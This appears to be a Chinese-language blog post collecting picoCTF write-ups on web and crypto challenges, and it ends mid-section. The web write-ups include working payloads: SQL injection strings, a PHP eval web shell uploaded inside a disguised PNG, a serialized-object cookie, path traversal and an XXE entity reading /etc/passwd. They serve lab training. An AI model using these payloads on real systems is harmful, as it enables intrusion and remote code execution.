---
abbrlink: 4f98706e
categories:
- CTF
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png
date: '2024-06-01T10:27:03+08:00'
mathjax: true
tags:
- PicoCTF
- 資安
title: All-in-One PicoCTF Writeups
updated: '2024-09-01T20:06:47.030+08:00'
---
# 前言

其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。

自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題左右才開始打算來寫 writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的 writeup，就這樣啦！希望能幫忙到你。

# Web

## unminify

先看題目，點開後他會說如果你打開了這個網頁，代表你的瀏覽器已經收到了 flag，只是他不知道要怎麼讀取它。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091116470.png)

既然他說了我們瀏覽器已經收到 flag 了，就打開 F12 看一下網頁代碼吧！點開開發者工具後，直接在 Element 的 Tab 裡面用 `Ctrl+F`搜尋 `picoCTF`字串，結果就直接找到了 XD。欸不是這題也太水了吧！

![利用開發者工具搜尋flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091535175.png)

```txt
picoCTF{pr3tty_c0d3_dbe259ce}
```

## picobrowser

這題我們點進 URL 後會看到一個 FLAG 的按鈕，按下去會發現我們不能得到 FLAG。![題目](https://hackmd.io/_uploads/SJB9S0p70.png)
他說我們應該要是 picobrowser，所以我就寫了一個 selenium 的 Python 腳本來運行，看看能不能拿到 flag。

```python
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time

my_user_agent = "picobrowser" # 這裡把agent改為picobrowser
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument(f"--user-agent={my_user_agent}")
service = Service(executable_path=ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=chrome_options)

url = "https://jupiter.challenges.picoctf.org/problem/28921/flag"

driver.get(url)
time.sleep(1337)
```

這樣就得到 flag 了！

```txt
picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
```

## SQLiLite

題目是一個登入頁面。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092406670.png)

我們先嘗試用 `admin, admin`登入看看。

![Login as admin](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092632509.png)

它會說 Login failed，但是我們可以看到它的 SQL 查詢語句是

```sqlite
SELECT * FROM users WHERE name='admin' AND password='admin'
```

所以我們就可以很輕鬆的用 SQL Injection 啦！這邊使用帳號 `' OR 1=1--`登入就可以啦，密碼不用輸入，或是隨便輸入也行。

![Logged in](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093002857.png)

但是他說 flag 在 plainsight 裡面所以我們看不見，那就打開開發者工具用 `Ctrl+F`搜尋吧！

![flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093133835.png)

```txt
picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
```

## More SQLi

把題目 launch 了之後會進入到一個登入頁面，如下圖。

![題目](https://hackmd.io/_uploads/BySNOmYUC.png)

然後我們先嘗試使用 `admin`作為帳號密碼登入。帳號密碼都輸入 `admin`後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。

![](https://hackmd.io/_uploads/r1wnu7KIR.png)

圖片有點小，總之他顯示的內容就是像下面這樣:

```txt
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```

所以我們在這邊把密碼用 `'OR 1=1 --`這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:

```sql=
SELECT id FROM users WHERE password = ''OR 1=1 --' AND username = 'admin'
```

可以從上面的代碼高亮的顏色發現，在 `1=1`後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:

![](https://hackmd.io/_uploads/rJjw6XYUC.png)

他可以查詢 City 的名稱，但其實一筆資料包含了 City, Address, Phone。分析一下後台可能的 SQL 語句，應該是如下:

```sql=
SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '';
```

再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做 `sqlite_master`的表來儲存一些表格的各種資訊。（[資訊來源](https://blog.csdn.net/luoshabugui/article/details/108327936)）

知道這些候我們輸入 `' UNION SELECT name, sql, 1337 FROM sqlite_master; --`讓整個 SQL 語句變成如下

```sql=
SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '' UNION SELECT name, sql, 1337 FROM sqlite_master; --';
```

這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是 sqlite_master 的表格內容，如下:

![找到flag所在的表格了](https://hackmd.io/_uploads/BysgmNY8R.png)

我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload `' UNION SELECT 1, flag, 1 FROM more_table; --`。輸入後就可以看到以下的介面啦！

![flag](https://hackmd.io/_uploads/SyoSNNtLA.png)

flag 就找到囉！

```txt
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
```

## Trickster

這題的題目是一個可以上傳 png 的網頁，看起來就是文件上傳漏洞，頁面如下:

![題目](https://hackmd.io/_uploads/HkocKNtIA.png)

~~秉持著不知道要幹嘛的時候先掃路徑的精神~~，可以找到它的 robots.txt，它其中禁止了兩個路徑，如下:

```txt
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

既然它都禁止了，我們就去看看吧 XD。`/uploads/`應該就是它的上傳後的文件路徑了，而它 instructions.txt 的內容如下:

```txt
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為 `.png`；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為 `50 4E 47`。

知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為 `hack.png`）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為 `hack.png.php`，並在檔案內容的 PNG 以下添加這個[php 一句話木馬](https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)

```php=
<?php @eval($_POST['shell']);?>
```

整個修改完後如下（點開來看可能會比較清楚）:

![一句話木馬](https://hackmd.io/_uploads/Sy7rFrYU0.png)

上傳完成後，現在這個 shell 就會位於 `a`這個位置上啦。

接下來再用[中國蟻劍](https://github.com/AntSwordProject/antSword)這款工具去連接那個 web shell 就可以啦，連接過程如下:

![輸入連接資訊](https://hackmd.io/_uploads/HJo4cSF8A.png)

連接完成後，就可以直接看一下網站的文件，看到以下這個 `.txt`應該就是 flag 了。

![貌似是flag的文件](https://hackmd.io/_uploads/SyahqSYLR.png)

![flag出來了](https://hackmd.io/_uploads/HJW1sBtI0.png)

於是我們就成功找到了 flag 啦！如下:

```txt
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```

這邊補充一個知識點，來講一下 `<?php @eval($_POST['shell']);?>`到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！

> 當然，這段 PHP 代碼的原理是允許遠程執行伺服器上的 PHP 代碼。這是如何工作的：
>
> 1. `<?php` 是 PHP 代碼的開始標記。
> 2. `@eval($_POST['shell']);` 中的 `eval()` 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 `shell` 的變量。
> 3. `@` 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。
> 4. 由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。
>
> 簡言之，任何通過 `shell` 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。

然後我後來找到了另一篇 writeup，它的 payload 比較酷，是一個即時執行的 input 框，有興趣可以去看一下[這篇](https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18)。

## Super Serial

這題先讀取 `/robots.txt`發現它有一個禁止的路徑為 `/admin.phps`，這似乎代表著它有支持 `.phps`文件。所以可以到 `/index.phps`裡面看它的源代碼。（`phps`為 PHP source）

![index.phps](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704170553939.png)

題目說 Flag 在 `../flag`中，所以解題的思路就是要想辦法讀取到 `../flag`。先把圖片上的程式碼拿出來分析一下。

```php
<?php
require_once "cookie.php";  # 這裡用到了cookie.php

if (isset($_POST["user"]) && isset($_POST["pass"])) {
    $con = new SQLite3("../users.db");
    $username = $_POST["user"];
    $password = $_POST["pass"];
    $perm_res = new permissions($username, $password);
    if ($perm_res->is_guest() || $perm_res->is_admin()) {
        setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + 86400 * 30, "/");
        header("Location: authentication.php");  # 這裡重定向到authentication.php
        die();
    } else {
        $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
    }
}
?>
```

由於可以透過 `.phps`查看原始代碼，所以先去查看 `cookie.phps`和 `authentication.phps`。可以發現在 `cookie.php`中有以下漏洞：

```php
if (isset($_COOKIE["login"])) {
    try {
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm->is_guest();
        $a = $perm->is_admin();
    } catch (Error $e) {
        die("Deserialization error. " . $perm);
    }
}
```

這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把 `$perm`輸出。在 `authentication.php`裡面的 `access_log`這個類中，他定義了 `__toString()`就是讀取並回傳 `log_file`的內容。

所以我們只要建立一個 `login`的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了 `login`的值為 `TEST`，成功觸發反序列化錯誤的訊息。

![Deserialization error](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160307961.png)

接著我們用[PHP Sandbox](https://onlinephp.io/)來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從 `cookie.phps`中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。

```php
<?php
print(urlencode(base64_encode(serialize("TEST"))))
?>
```

他這邊輸出了 `czo0OiJURVNUIjs%3D`，我們把 cookie 的值修改為這個試試看，能不能正確的輸出 `TEST`。

![PoC](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160839984.png)

成功！再來我們只需要 new 一個 access_log 的 class，並且把他的 `$log_file`設定為 `"../flag"`就可以了！Exploit 如下。

```php
<?php

class access_log
{
	public $log_file = "../flag";

}

$payload = new access_log();

print(urlencode(base64_encode(serialize($payload))))
?>
```

上面這個代碼執行後會得到

```txt
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

這個就是我們最終的 Payload 啦，把它貼到 `login`的 cookie 的 value，並重新整理頁面試試看吧。

![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706161944368.png)

```txt
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
```

## Java Code Analysis!?!

這題稍微大一點，是一個電子書系統。一開始他給了一個登入介面還有一組帳密：帳號 `user`，密碼 `user`。除此之外，也有給源代碼。我們先來看看網頁的樣子。

![Login](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143233744.png)

登入後會看到更多的功能，包括閱讀書籍、查詢書籍、查看帳戶等等。登入後的介面如下。

![Home page](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143405607.png)

題目告訴我們，這題的 Winning condition 是要讀取到 Flag 的書籍，就可以獲得 Flag 了。但是向上圖所看到的，我們現在是 Free user，而 Flag 這本書只有 Admin 可以閱讀，所以要來想辦法提升權限。

**// TODO**

## IntroToBurp

這題要用到 BurpSuite 來攔截封包。首先先把 Burp 的攔截給打開。

![打開攔截](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240819164944293.png)

接著把 Browser 打開並連接到題目給的 URL。發現是個註冊頁面，先亂填一些東西試試。填完後按下 Register 會發現 Burp 攔截了我們的封包，這邊不用對封包做修改，直接按下 Forward 送過去。接著會跳到一個 OTP 驗證頁面，一樣先隨便輸入一些東西。

![2FA Auth](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240819165409960.png)

接著到 Burp 裡面修改 OTP 的數據，直接把整行刪掉。

![BurpSuite](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240819165507475.png)

刪掉後直接 Forward 把封包送過去就行啦！如果只是留空白按 Submit，還是會發送一個 OTP 的 Data，所以要用 Burp 直接刪掉。就如同題目給的提示一樣。

> Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.

```txt
picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}
```

## Forbidden Paths

題目介紹如下：

> Can you get the flag? We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?
>
> Additional details will be available after launching your challenge instance.

把題目給的網站點開來看長這樣。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_73025f05e72f6debf09b6484921102bd.png)

測試一下上面這些 txt 檔案後後發現就是一個可以讀檔案的程式，既然題目都告訴我們這個網站專案路徑了，那就只需要回推回根目錄就可以了。因為是 `/usr/share/nginx/html/`有四層，那就回去四層前的目錄並讀取 `flag.txt`就可以了。最終Payload如下。

```txt
../../../../flag.txt
```

Flag 就跑出來啦！如下。

```txt
picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}
```

## It is my Birthday

題目敘述

> I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website.

看了敘述後可以發現應該是要上傳兩個具有相同 MD5 Hash 值得 PDF 文件。這邊我們可以直接使用[這個 Github Repo](https://github.com/corkami/collisions/tree/master/examples/free) 裡面的 **md5-1.pdf** 和 **md5-2.pdf**。把這兩個檔案下載下來後上傳到題目的網站就可以了。

```txt
picoCTF{c0ngr4ts_u_r_1nv1t3d_aebcbf39}
```

## Irish-Name-Repo 1

題目敘述

> There is a website running at `a` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or [http://jupiter.challenges.picoctf.org:39720](http://jupiter.challenges.picoctf.org:39720). Do you think you can log us in? Try to see if you can login!

所以就是要登入啦。先到Login的頁面看看，發現他傳到 `login.php`的參數中有一個 `debug=0`，如下。

![debug=0](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_ca9db2efbbd073e8976545347ab4bac9.png)

所以使用BurpSuite打開網頁並修改參數。把 `debug=0`改為 `debug=1`，然後Forward請求後會發現傳回來的debug訊息。

![Debug Mode](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_00819763eb396b4830a7d6e748ed4e98.png)

既然知道他的SQL語句，就可以直接SQLi啦。Payload是 `' OR 1=1--`，順利得到Flag。

```txt
picoCTF{s0m3_SQL_c218b685}
```

## SOAP

這題根據題目給的提示，是一個XXE漏洞。我對於XXE沒什麼了解，去參考了[這篇文章](https://ithelp.ithome.com.tw/articles/10339624)，裡面有關於XXE比較詳細的介紹。至於這題，先用BurpSuite打開去攔截過程中傳送的封包。

打開後網站後，發現點選這三個按鈕都會觸發一個請求。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_6e336e2d693ea607f9ddf4ed86ba485e.png)

我們先隨便點一個讓Burp抓到他的封包，我們在進一步修改XML Payload。封包內容長下面這樣。

![封包內容](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_4ebeddb4957c4760a8cdeab8f7c2a778.png)

因為題目有說要讀取 `/etc/passwd`這個路徑，所以我們把封包修改一下變成下面這樣。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  
<!ENTITY ext SYSTEM "file:///etc/passwd">
]>
<data>
	<ID>&ext;</ID>
</data>
```

把請求Forward之後，看到網頁上回傳的內容如下。

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_86556b71eb01e19bc33ffcf13bca4794.png)

就成功找到Flag啦。

```txt
picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
```

## SQL Direct

這題要連接到PostgreSQL的資料庫，先打開Kali。打開後輸入以下命令連接到資料庫，密碼為`postgres`。

```bash
psql -h saturn.picoctf.net -p 51152 -U postgres pico
```

- `-h`代表Host
- `-p`代表Port
- `-U`代表Username
- `pico`代表資料庫名稱

連接到後可以先輸入`\d`查看Tables。

```txt
pico=# \d
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)
```

可以看到有一個叫做`flags`的表，這邊直接用以下命令把資料查詢出來。

```postgresql
SELECT * FROM flags;
```

果然看到Flag了。

```txt
picoCTF{L3arN_S0m3_5qL_t0d4Y_73b0678f}
```

# Crypto

- [My scripts & note on Github](https://github.com/CX330Blake/Crypto_Notebook)
- [Cryptography Notebook 密碼學任督二脈](https://blog.cx330.tw/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/)

## Easy1

```txt
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
   +----------------------------------------------------
A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A
C | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B
D | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
E | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D
F | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E
G | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F
H | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G
I | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H
J | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I
K | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J
L | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K
M | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L
N | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M
O | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N
P | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O
Q | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P
R | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q
S | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R
T | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S
U | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T
V | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U
W | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V
X | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W
Y | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X
Z | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y

Cipher: UFJKXQZQUNB
Key: SOLVECRYPTO
```

這題是一個維吉尼亞密碼。維吉尼亞密碼（法語：Chiffre de Vigenère，又譯維熱納爾密碼）是使用一系列凱撒密碼組成密碼字母表的加密算法，屬於多表密碼的一種簡單形式。[維基百科](https://zh.wikipedia.org/zh-tw/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81)
解密的方式也很簡單，最上面一列是明文，最左邊那行是 KEY，這樣對應起來中間的字元就是密文。知道了這個之後回推回去就可以得到明文。

```python
cipher = "UFJKXQZQUNB"
key = "SOLVECRYPTO"

pt = ""

for i in range(len(cipher)):
    shift = ord(key[i]) - 65  # 獲取密鑰字母的偏移量
    c = ord(cipher[i])  # 獲取密文當中目前的字母

    c = (c - shift - 65) % 26 + 65  # 用偏移量進行解密
    pt += chr(c)

print(f"Message: {pt}")
```

而最後的 flag 如下

```txt
picoCTF{CRYPTOISFUN}
```

## Caesar

如同題目所說，這題就是個基本的凱薩加密。題目給了加密過的 flag

```txt
picoCTF{gvswwmrkxlivyfmgsrhnrisegl}
```

就把裡面那串拿去解密，因為不知道偏移量是多少，所以就暴力破解。

```python
cipher = "gvswwmrkxlivyfmgsrhnrisegl"


def caesar_cipher(text, shift):
    plaintext = ""
    for c in text:
        plaintext += chr((ord(c) - 97 + shift) % 26 + 97)
    return plaintext


for i in range(26):
    plaintext = caesar_cipher(cipher, i)
    print(f"Shift {i}: {plaintext}")
```

跑出來的結果中，看起來是 `crossingtherubicondjneoach`最合理，所以這就是 flag 了

```txt
picoCTF{crossingtherubicondjneoach}
```

## New Caesar

題目給了一個密文和一個 Python 腳本。

```txt
apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna
```

```python
import string

LOWERCASE_OFFSET = ord("a")
ALPHABET = string.ascii_lowercase[:16]

def b16_encode(plain):
	enc = ""
	for c in plain:
		binary = "{0:08b}".format(ord(c))
		enc += ALPHABET[int(binary[:4], 2)]
		enc += ALPHABET[int(binary[4:], 2)]
	return enc

def shift(c, k):
	t1 = ord(c) - LOWERCASE_OFFSET
	t2 = ord(k) - LOWERCASE_OFFSET
	return ALPHABET[(t1 + t2) % len(ALPHABET)]

flag = "redacted"
key = "redacted"
assert all([k in ALPHABET for k in key])
assert len(key) == 1

b16 = b16_encode(flag)
enc = ""
for i, c in enumerate(b16):
	enc += shift(c, key[i % len(key)])
print(enc)
```

先觀察這個加密腳本。發現他是把明文每個字母的 Ascii 值轉為 Binary 後，從左邊補 0 補到 8 個 Bits，然後每 4 位元分為一塊，每塊的二進制數字（0 ～ 15）映射到 Base16 的字符集（a ～ p）。再把這個東西拿去做 shift，就是凱薩加密的變形。

總之解密的話就是反著來，就不詳細解釋了。Exploit 如下：

```python
import string

LOWERCASE_OFFSET = ord("a")
ALPHABET = string.ascii_lowercase[:16]


def b16_encode(plain):
    enc = ""
    for c in plain:
        binary = "{0:08b}".format(ord(c))
        enc += ALPHABET[int(binary[:4], 2)]  # Since 4 bits can represent 16 characters
        enc += ALPHABET[int(binary[4:], 2)]
    return enc


def b16_decode(b16):
    dec = ""
    for c in range(0, len(b16), 2):
        first = b16[c]
        second = b16[c + 1]
        first_index = ALPHABET.index(first)
        second_index = ALPHABET.index(second)
        binary = bin(first_index)[2:].zfill(4) + bin(second_index)[2:].zfill(4)
        dec += chr(int(binary, 2))
    return dec


def shift(c, k):
    t1 = ord(c) - LOWERCASE_OFFSET  # (c - 97 + k - 97) % 16 = result
    t2 = ord(k) - LOWERCASE_OFFSET
    return ALPHABET[(t1 + t2) % len(ALPHABET)]  # two numbers sum modulo 16


def inverse_shift(c, k):
    t1 = ord(c) - LOWERCASE_OFFSET
    t2 = ord(k) - LOWERCASE_OFFSET
    return ALPHABET[(t1 - t2) % len(ALPHABET)]  # two numbers difference modulo 16


enc = "apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna"
for key in ALPHABET:
    dec = ""
    for i, c in enumerate(enc):
        dec += inverse_shift(c, key[i % len(key)])
    b16_dec = b16_decode(dec)
    print(f"Decrypted flag: {b16_dec}")
```

暴力破解後，看起來最像 Flag 的就是 `et_tu?_23217b54456fb10e908b5e87c6e89156`這個了。最後自己幫它包上 `picoCTF{}`提交，果然是正確的。

```txt
picoCTF{et_tu?_23217b54456fb10e908b5e87c6e89156}
```

## rotation

這題給了一個加密後的密文。

```txt
xqkwKBN{z0bib1wv_l3kzgxb3l_949in1i1}
```

看起來就是 Transposition Cipher，直接拿去網路上那種凱薩密碼暴力破解。這邊使用[CyberChef](https://gchq.github.io/CyberChef/)。

![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706165309173.png)

```txt
picoCTF{r0tat1on_d3crypt3d_949af1a1}
```

## Mind your Ps and Qs

這題是個 RSA 加密，先來複習一下 RSA 加密裡面的流程和參數。

- $\text{Find two prime numbers } p \text{ and } q$
- $n = p \times q$
- $\phi(n) = (p-1) \times (q-1)$
- $e \text{ is the encryption exponent}$
- $d = e^{-1} \mod \phi(n)$
- $c \text{ is the encrypted message}; \quad c = m^e \mod n$
- $m \text{ is the message}; \quad m = c^d \mod n$
- $\text{Public key} = (e, n)$
- $\text{Private key} = (d, n)$

複習完後，看一下題目的說明。

```txt
Description:
In RSA, a small e value can be problematic, but what about N? Can you decrypt this?
==============================
Decrypt my super sick RSA:
c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684
n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637
e: 65537
```

這題的敘述中告訴我們，當 e 太小的時候我們可以使用小公鑰指數攻擊(Low public exponent attack)，而題目要我們思考當 N 太小的時候我們可以如何利用。

回去看一下 RSA 加密的流程後，我們發現 N 是兩個質數的乘積，而當 N 太小的時候我們就可以暴力破解出兩個 P 跟 Q。這裡我們直接使用 FactorDB 去找 N 的因數，就可以找到 P 和 Q 了。

而有了 P 和 Q，我們就可以順著 RSA 流程找到明文 M 了，我寫了個 Python 幫我找出明文，如下

```python
from Crypto.Util.number import inverse, long_to_bytes
from factordb.factordb import FactorDB


def long2str(long_int: int) -> str:
    return long_to_bytes(long_int).decode()


c = 421345306292040663864066688931456845278496274597031632020995583473619804626233684
n = 631371953793368771804570727896887140714495090919073481680274581226742748040342637
e = 65537

# From Factor db find p and q
f = FactorDB(n)
f.connect()
factors = f.get_factor_list()
p = factors[0]
q = factors[1]

phi_n = (p - 1) * (q - 1)

d = inverse(e, phi_n)
print(f"Private key: d = {d}")
m = pow(c, d, n)
print(f"Decrypted message: m = {long2str(m)}")
```

最後找到的明文會是一個很大的數字，這時候再用 Crypto.Util.number 的 long_to_bytes 並 decode，將其轉為字符串，就可以得到 flag 了。

```txt
picoCTF{sma11_N_n0_g0od_55304594}
```

## No padding, no problem

> 可以先看過這篇 [Day 14:[離散數學]同餘（Mod）是什麼？](https://ithelp.ithome.com.tw/articles/10205727)

當我們把題目給的密文拿去解密，他會說 `Will not decrypt the ciphertext. Try Again`。代表題目的這支程式應該是在偵測我們輸入的是否為 Ciphertext。而我們知道

$$
Plaintext = c^d \mod n
$$

$$
c^d \mod n = (c+n)^d \mod n
$$

所以我們利用題目給的 c 和 n 相加後，輸入到他的程式會得到:

```txt
Here you go: 290275030195850039473456618367455885069965748851278076756743720446703314517401359267322769037469251445384426639837648598397
```

接著只要再利用 Crypto 的 long_to_bytes3 方法就可以找到明文，如下:

```python
from Crypto.Util.number import long_to_bytes
from pwn import *

r = remote("mercury.picoctf.net", 10333)
r.recvuntil("n:")
n = int(r.recvline().strip())
r.recvuntil("ciphertext:")
c = int(r.recvline().strip())
num = n + c
r.sendline(str(num))
r.recvuntil("Here you go:")
m = int(r.recvline().strip())
r.close()

print(long_to_bytes(m))
```

```txt
picoCTF{m4yb3_Th0se_m3s54g3s_4r3_difurrent_1772735}
```

## interencdec

題目給了密文 enc_flag，如下。

```txt
YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6YzRNalV3YUcxcWZRPT0nCg==
```

因為他最後面的兩個 `==`讓他看起來很像是 base64 的格式，所以就用 base64 先 Decode 一下。這邊用的是[CyberChef](https://gchq.github.io/CyberChef/)這款工具，他可以線上進行很多種的編碼解碼、加密等等。

![b64 decode](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163439113.png)

```txt
d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzc4MjUwaG1qfQ==
```

解碼一次後長這樣，還是很像 base64 的格式，所以我又做了一次 base64 解碼。（注意：這邊要把前面的 b 拿掉，只留引號中的內容）

![b64 decode](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163700571.png)

```txt
wpjvJAM{jhlzhy_k3jy9wa3k_78250hmj}
```

再解碼一次後變成了這樣的形狀，看起來已經有 Flag 的雛型了（因為大括號），所以猜測它是某種置換密碼。就用最普遍的凱薩密碼來暴力解解看吧！Exploit 如下：

```python
enc_flag = input("Enter the encrypted flag: ")

for i in range(1, 27):
    dec_flag = ""
    for char in enc_flag:
        if char.isalpha():
            if char.isupper():
                dec_flag += chr((ord(char) - ord("A") - i) % 26 + ord("A"))
            else:
                dec_flag += chr((ord(char) - ord("a") - i) % 26 + ord("a"))
        else:
            dec_flag += char
    if "pico" in dec_flag.lower():
        print(dec_flag)
```

```txt
picoCTF{caesar_d3cr9pt3d_78250afc}
```

## Easy peasy

> 想了解 OTP 可以去看看這個 [一次性密碼本](https://zh.wikipedia.org/zh-tw/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC)

先看題目。

```txt
******************Welcome to our OTP implementation!******************
This is the encrypted flag!
